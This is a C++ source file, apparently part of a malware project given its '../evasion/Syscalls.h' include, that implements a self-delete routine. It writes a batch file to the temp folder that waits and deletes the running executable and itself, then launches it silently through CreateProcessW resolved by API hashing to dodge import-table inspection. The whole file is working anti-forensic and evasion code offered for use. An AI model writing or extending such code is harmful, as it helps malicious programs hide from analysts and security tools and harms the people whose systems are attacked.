#include "Cleanup.h"
#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include "../evasion/Syscalls.h"

#include "Shared.h"
#include <fstream>
#include "../evasion/Syscalls.h"

namespace {
std::string WideToMultiByte(const std::wstring& wstr) {
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}
}

namespace cleanup {

void SelfDelete() {
    std::vector<wchar_t> path_buf;
    DWORD copied = 0;
    do {
        path_buf.resize(path_buf.size() + MAX_PATH);
        copied = GetModuleFileNameW(NULL, path_buf.data(), static_cast<DWORD>(path_buf.size()));
    } while (copied >= path_buf.size());
    path_buf.resize(copied);
    std::wstring executablePath(path_buf.begin(), path_buf.end());

    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring batPath = std::wstring(tempPath) + L"\\del.bat";

    std::string batContent = "@echo off\r\n"
                             "ping 127.0.0.1 -n 3 > nul\r\n"
                             "del /Q \"" + WideToMultiByte(executablePath) + "\"\r\n"
                             "del /Q \"" + WideToMultiByte(batPath) + "\"";

    HANDLE hFile = CreateFileW(batPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        WriteFile(hFile, batContent.c_str(), (DWORD)batContent.length(), &bytesWritten, NULL);
        CloseHandle(hFile);

        std::wstring command = L"cmd.exe /C \"" + batPath + L"\"";

        HMODULE hKernel = GetModuleHandleA("kernel32.dll");
        using CreateProc = BOOL(WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
        DWORD hash = djb2Hash("CreateProcessW");
        CreateProc pCreate = (CreateProc)getProcByHash(hKernel, hash);

        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        pCreate(NULL, &command[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

} // namespace cleanup
